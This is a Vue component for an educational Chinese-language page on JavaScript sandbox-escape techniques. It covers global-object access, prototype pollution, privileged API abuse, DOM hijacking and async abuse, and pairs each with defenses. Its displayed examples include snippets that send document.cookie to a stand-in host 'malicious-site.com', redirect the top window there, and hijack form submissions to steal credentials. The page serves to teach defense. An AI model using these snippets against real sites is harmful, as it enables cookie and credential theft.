<template>
  <div class="sandbox-escape-container">
    <header>
      <h1>JavaScript沙箱逃逸技术解析</h1>
      <p>沙箱逃逸是指恶意代码突破执行环境限制，访问或影响外部环境的过程</p>
    </header>

    <div class="content-grid">
      <section class="intro-section">
        <h2>什么是JS沙箱？</h2>
        <div class="card">
          <p>JavaScript沙箱是一种安全机制，用于隔离不受信任的代码执行环境，防止其对主应用程序或用户系统造成损害。</p>
          <div class="sandbox-diagram">
            <div class="host-environment">
              <span>宿主环境</span>
              <div class="sandbox">
                <span>沙箱环境</span>
                <div class="untrusted-code">不受信任的代码</div>
              </div>
            </div>
          </div>
          <p>沙箱通过限制代码的访问权限（如全局对象、DOM API、网络请求等）来实现隔离。</p>
        </div>
      </section>

      <section class="methods-section">
        <h2>常见沙箱逃逸方式</h2>
        <div class="escape-methods">
          <div v-for="(method, index) in escapeMethods" :key="index" class="method-card"
            :class="{ 'active': activeMethod === index }" @click="activeMethod = index">
            <div class="method-header">
              <div class="method-icon">
                <span :class="method.icon"></span>
              </div>
              <h3>{{ method.title }}</h3>
            </div>
            <p>{{ method.description }}</p>
          </div>
        </div>
      </section>

      <section class="details-section">
        <div v-if="activeMethod !== null" class="method-details">
          <h3>{{ escapeMethods[activeMethod].title }} 逃逸</h3>
          <div class="severity">
            危险等级:
            <span :class="'level-' + escapeMethods[activeMethod].severity">
              {{ ['低', '中', '高'][escapeMethods[activeMethod].severity - 1] }}
            </span>
          </div>
          <h4>实现原理</h4>
          <p>{{ escapeMethods[activeMethod].principle }}</p>

          <h4>示例代码</h4>
          <pre><code>{{ escapeMethods[activeMethod].example }}</code></pre>

          <h4>防护方案</h4>
          <ul>
            <li v-for="(solution, idx) in escapeMethods[activeMethod].solutions" :key="idx">{{ solution }}</li>
          </ul>
        </div>
        <div v-else class="method-placeholder">
          <div class="placeholder-content">
            <i class="icon-info"></i>
            <p>请从左侧选择一种逃逸方式查看详细信息</p>
          </div>
        </div>
      </section>

      <section class="prevention-section">
        <h2>全面防护策略</h2>
        <div class="prevention-strategies">
          <div class="strategy">
            <div class="number">1</div>
            <h3>严格内容安全策略(CSP)</h3>
            <p>通过HTTP头部设置严格的CSP策略，限制脚本执行来源</p>
          </div>
          <div class="strategy">
            <div class="number">2</div>
            <h3>使用专业沙箱环境</h3>
            <p>采用经过安全测试的沙箱方案，如Google Caja、JSFiddle的沙箱实现</p>
          </div>
          <div class="strategy">
            <div class="number">3</div>
            <h3>多层防御机制</h3>
            <p>结合Proxy、iframe隔离、CSP等多种技术构建纵深防御</p>
          </div>
          <div class="strategy">
            <div class="number">4</div>
            <h3>持续安全审计</h3>
            <p>定期进行安全审计和渗透测试，及时修补漏洞</p>
          </div>
        </div>
      </section>
    </div>

    <footer>
      <p>安全提示：在生产环境中执行不受信任的JS代码时，必须采取多重防护措施</p>
      <div class="footer-links">
        <span> Web安全实验室</span>
        <span>沙箱逃逸研究报告 v1.2</span>
      </div>
    </footer>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue';

const activeMethod = ref<number | null>(null);

const escapeMethods = [
  {
    title: "全局对象访问",
    icon: "icon-globe",
    description: "通过特殊方式访问被沙箱隐藏的全局对象",
    principle: "沙箱通常通过代理或覆盖全局对象(如window)来限制访问，但某些实现可能未完全覆盖所有访问路径。通过构造函数、函数调用上下文或特殊对象(如top、parent)可能绕过限制访问到真实的全局对象。",
    example: `// 通过Function构造函数访问
const getGlobal = new Function('return this;');
const realWindow = getGlobal();

// 通过函数调用上下文
function getWindow() {
  return this;
}
const window = getWindow.call(null); // 非严格模式下

// 通过DOM元素
const iframe = document.createElement('iframe');
document.body.appendChild(iframe);
const realWindow = iframe.contentWindow.parent;`,
    solutions: [
      "使用严格模式('use strict')防止函数调用泄露全局对象",
      "完全代理全局对象，确保所有访问都经过代理层",
      "禁用Function构造函数和eval等动态执行功能",
      "隔离DOM操作，防止通过DOM元素访问外部环境"
    ],
    severity: 3 // 高
  },
  {
    title: "原型链污染",
    icon: "icon-chain",
    description: "通过修改原型链影响沙箱外部对象",
    principle: "JavaScript的原型链机制允许对象访问其原型上的属性和方法。如果沙箱内部代码能够访问到外部环境中的对象原型(如Object.prototype)，修改这些原型会影响所有继承自该原型的对象，从而影响外部环境。",
    example: `// 污染基本对象原型
Object.prototype.sandboxEscape = true;

// 污染数组原型
Array.prototype.executeMaliciousCode = function() {
  fetch('https://malicious-site.com', {
    method: 'POST',
    body: JSON.stringify(document.cookie)
  });
};

// 通过已存在的实例影响外部环境
[].executeMaliciousCode(); // 执行恶意代码`,
    solutions: [
      "在沙箱中冻结基础对象的原型(Object.freeze)",
      "为沙箱提供纯净的、隔离的原型链",
      "使用Object.create(null)创建无原型的对象作为沙箱全局对象",
      "监控原型对象的修改行为"
    ],
    severity: 2 // 中
  },
  {
    title: "特权API滥用",
    icon: "icon-lock-open",
    description: "利用沙箱未完全屏蔽的特权API执行逃逸",
    principle: "沙箱可能未能完全禁用某些强大的API，如Function构造函数、eval、Web Workers、动态import等。这些API可能被用来执行未受监控的代码或绕过沙箱限制。",
    example: `// 使用Function构造函数绕过
const dynamicFunc = new Function('alert("Escaped!");');
dynamicFunc();

// 利用Web Workers
const workerCode = \`postMessage(JSON.stringify(document.cookie));\`;
const blob = new Blob([workerCode], {type: 'application/javascript'});
const worker = new Worker(URL.createObjectURL(blob));
worker.onmessage = (e) => {
  fetch('https://malicious-site.com/steal?data=' + e.data);
};

// 动态import
import('data:text/javascript,alert("Escaped!")');`,
    solutions: [
      "彻底禁用eval、Function等动态代码执行功能",
      "重写或删除Web Workers、WebSocket等高级API",
      "监控所有可能执行代码的API调用",
      "使用内容安全策略(CSP)限制代码来源"
    ],
    severity: 3 // 高
  },
  {
    title: "DOM操作逃逸",
    icon: "icon-dom",
    description: "通过DOM操作间接影响外部环境",
    principle: "即使JavaScript执行环境被隔离，如果沙箱代码可以访问DOM，它可能通过修改DOM元素或添加事件处理器等方式影响外部环境。特别是当沙箱在同一个文档中运行时，这种风险更高。",
    example: `// 修改外部页面元素
document.getElementById('external-element').innerHTML =
  '<img src="x" onerror="maliciousCode()">';

// 添加事件监听器
document.addEventListener('click', (e) => {
  if (e.target.closest('.external-element')) {
    executeMaliciousCode();
  }
});

// 劫持表单提交
document.querySelector('form').addEventListener('submit', (e) => {
  e.preventDefault();
  sendCredentialsToAttacker();
});`,
    solutions: [
      "在单独的iframe中运行沙箱代码，实现DOM隔离",
      "使用Shadow DOM封装沙箱内容",
      "对DOM API进行代理和过滤，限制可访问的元素范围",
      "清理和转义所有用户生成的HTML内容"
    ],
    severity: 2 // 中
  },
  {
    title: "异步操作利用",
    icon: "icon-async",
    description: "利用异步操作绕过沙箱的同步监控",
    principle: "沙箱可能在同步代码执行期间进行监控，但异步操作（如setTimeout、Promise、事件处理）可能在沙箱监控范围之外执行，从而有机会访问外部环境。",
    example: `// 通过setTimeout逃逸
setTimeout(() => {
  // 此时可能已离开沙箱的严格监控环境
  top.location = 'https://malicious-site.com';
}, 1000);

// 利用Promise
Promise.resolve().then(() => {
  document.body.innerHTML = '<h1>Page Hacked!</h1>';
});

// 通过事件处理
window.addEventListener('load', () => {
  // 在页面加载完成后执行逃逸代码
  stealCookies();
});`,
    solutions: [
      "代理所有异步API(setTimeout, setInterval, Promise等)",
      "在异步回调执行前重新应用沙箱环境",
      "使用Zone.js等库对异步操作进行上下文跟踪",
      "限制异步操作的最大延迟时间和数量"
    ],
    severity: 2 // 中
  }
];
</script>

<style lang="less" scoped>


// 颜色变量
@primary-color: #4361ee;
@secondary-color: #3f37c9;
@danger-color: #e63946;
@warning-color: #f8961e;
@success-color: #2a9d8f;
@light-bg: #f8f9fa;
@card-bg: #ffffff;
@text-dark: #212529;
@text-light: #6c757d;
@border-color: #dee2e6;
@code-bg: #f1f3f5;

// 混合
.box-shadow {
  box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.05);
}

.border-radius {
  border-radius: 10px;
}

.transition {
  transition: all 0.3s ease;
}

// 基础样式
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

.sandbox-escape-container {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background-color: @light-bg;
  color: @text-dark;
  line-height: 1.6;
  padding: 20px;
  max-width: 1400px;
  margin: 0 auto;

  header {
    text-align: center;
    margin-bottom: 30px;
    padding: 20px 0;

    h1 {
      font-size: 2.2rem;
      font-weight: 700;
      color: @primary-color;
      margin-bottom: 10px;
    }

    p {
      font-size: 1.1rem;
      color: @text-light;
      max-width: 800px;
      margin: 0 auto;
    }
  }

  .content-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 25px;

    @media (max-width: 900px) {
      grid-template-columns: 1fr;
    }

    section {
      margin-bottom: 25px;

      h2 {
        font-size: 1.5rem;
        font-weight: 600;
        color: @secondary-color;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 2px solid @border-color;
      }
    }

    .card {
      background: @card-bg;
      .box-shadow();
      .border-radius();
      padding: 20px;
      margin-bottom: 20px;
      border: 1px solid @border-color;
    }
  }

  // 沙箱图示样式
  .sandbox-diagram {
    margin: 20px 0;
    padding: 15px;
    background: lighten(@primary-color, 45%);
    .border-radius();

    .host-environment {
      position: relative;
      padding: 60px 20px 20px;
      border: 2px dashed @primary-color;
      .border-radius();
      text-align: center;

      span {
        position: absolute;
        top: 10px;
        left: 10px;
        font-weight: 500;
        color: @primary-color;
      }

      .sandbox {
        position: relative;
        padding: 50px 15px 15px;
        margin: 15px;
        border: 2px solid @danger-color;
        .border-radius();
        background: lighten(@danger-color, 40%);

        span {
          position: absolute;
          top: 10px;
          left: 10px;
          font-weight: 500;
          color: @danger-color;
        }

        .untrusted-code {
          padding: 15px;
          background: lighten(@warning-color, 40%);
          border: 1px solid @warning-color;
          .border-radius();
          font-weight: 500;
          color: darken(@warning-color, 20%);
        }
      }
    }
  }

  // 逃逸方式卡片
  .escape-methods {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
    gap: 15px;

    .method-card {
      background: @card-bg;
      border: 1px solid @border-color;
      .border-radius();
      padding: 15px;
      .transition();
      cursor: pointer;

      &:hover {
        transform: translateY(-5px);
        border-color: @primary-color;
      }

      &.active {
        border-color: @primary-color;
        background: lighten(@primary-color, 40%);
        border-left: 4px solid @primary-color;
      }

      .method-header {
        display: flex;
        align-items: center;
        margin-bottom: 10px;

        .method-icon {
          width: 40px;
          height: 40px;
          background: lighten(@primary-color, 35%);
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          margin-right: 12px;

          span {
            font-size: 1.2rem;
            color: @primary-color;
          }
        }

        h3 {
          font-size: 1.1rem;
          font-weight: 600;
          margin: 0;
        }
      }

      p {
        font-size: 0.9rem;
        color: @text-light;
      }
    }
  }

  // 方法详情
  .method-details {
    background: @card-bg;
    .box-shadow();
    .border-radius();
    padding: 25px;
    border-top: 4px solid @primary-color;

    h3 {
      font-size: 1.4rem;
      margin-bottom: 10px;
      color: @primary-color;
    }

    .severity {
      margin-bottom: 20px;
      font-weight: 500;

      span {
        padding: 3px 10px;
        border-radius: 20px;
        font-weight: 600;

        &.level-1 {
          background: lighten(@success-color, 50%);
          color: darken(@success-color, 20%);
        }

        &.level-2 {
          background: lighten(@warning-color, 40%);
          color: darken(@warning-color, 20%);
        }

        &.level-3 {
          background: lighten(@danger-color, 40%);
          color: darken(@danger-color, 20%);
        }
      }
    }

    h4 {
      font-size: 1.1rem;
      margin: 20px 0 10px;
      color: @secondary-color;
      padding-bottom: 5px;
      border-bottom: 1px solid @border-color;
    }

    pre {
      background: @code-bg;
      padding: 15px;
      border-radius: 8px;
      overflow-x: auto;
      margin: 15px 0;
      border-left: 3px solid @primary-color;

      code {
        font-family: 'Fira Code', monospace;
        font-size: 0.85rem;
        color: @text-dark;
        line-height: 1.5;
      }
    }

    ul {
      padding-left: 20px;
      margin: 15px 0;

      li {
        margin-bottom: 8px;
        padding-left: 10px;
        position: relative;

        &:before {
          content: '';
          position: absolute;
          left: 0;
          top: 8px;
          width: 6px;
          height: 6px;
          background: @success-color;
          border-radius: 50%;
        }
      }
    }
  }

  .method-placeholder {
    background: @card-bg;
    .box-shadow();
    .border-radius();
    padding: 40px 20px;
    text-align: center;
    border: 2px dashed @border-color;

    .placeholder-content {
      max-width: 400px;
      margin: 0 auto;

      .icon-info {
        font-size: 3rem;
        color: @border-color;
        margin-bottom: 20px;
        display: block;
      }

      p {
        color: @text-light;
        font-size: 1.1rem;
      }
    }
  }

  // 防护策略
  .prevention-strategies {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
    gap: 20px;

    .strategy {
      background: @card-bg;
      .box-shadow();
      .border-radius();
      padding: 25px 20px 20px;
      position: relative;
      border-top: 4px solid @success-color;

      .number {
        position: absolute;
        top: -15px;
        left: 20px;
        width: 30px;
        height: 30px;
        background: @success-color;
        color: white;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 700;
        font-size: 1.1rem;
      }

      h3 {
        font-size: 1.2rem;
        margin: 10px 0 15px;
        color: @secondary-color;
      }

      p {
        color: @text-light;
        font-size: 0.95rem;
      }
    }
  }

  footer {
    margin-top: 40px;
    padding-top: 20px;
    border-top: 1px solid @border-color;
    text-align: center;

    p {
      font-weight: 500;
      color: @danger-color;
      margin-bottom: 10px;
    }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      font-size: 0.9rem;
      color: @text-light;
    }
  }
}

// 图标字体
@font-face {
  font-family: 'sandbox-icons';
  src: url('data:application/font-woff;charset=utf-8;base64,d09GRgABAAAAAAUcAAsAAAAAB2QAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAABCAAAAGAAAABgDxIFDGNtYXAAAAFoAAAAVAAAAFQXVtGJZ2FzcAAAAbwAAAAIAAAACAAAABBnbHlmAAABxAAAAZAAAAGQO4l8eGhlYWQAAANMAAAANgAAADYD5wOzaGhlYQAAA4QAAAAkAAAAJAdCA4dobXR4AAADqAAAABQAAAAUCAQAAGxvY2EAAAO8AAAAEAAAABAB4gGcbWF4cAAAA+QAAAAgAAAAIAATAChuYW1lAAAEBAAAAFkAAABZChzBxXBvc3QAAARsAAAAIAAAACAAAwAAAAMD7AGQAAUAAAKZAswAAACPApkCzAAAAesAMwEJAAAAAAAAAAAAAAAAAAAAARAAAAAAAAAAAAAAAAAAAAAAQAAA6QMDwP/AAEADwABAAAAAAQAAAAAAAAAAAAAAIAAAAAAAAwAAAAMAAAAcAAEAAwAAABwAAwABAAAAHAAEADgAAAAKAAgAAgACAAEAIOkD//3//wAAAAAAIOkA//3//wAB/+MXBAADAAEAAAAAAAAAAAAAAAEAAQAAAAEAAAAAAAAAAAAA') format('woff');
}

[class^="icon-"],
[class*=" icon-"] {
  font-family: 'sandbox-icons' !important;
  speak: never;
  font-style: normal;
  font-weight: normal;
  font-variant: normal;
  text-transform: none;
  line-height: 1;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

.icon-globe:before {
  content: "\e900";
}

.icon-chain:before {
  content: "\e901";
}

.icon-lock-open:before {
  content: "\e902";
}

.icon-dom:before {
  content: "\e903";
}

.icon-async:before {
  content: "\e904";
}

.icon-info:before {
  content: "\e905";
}
</style>
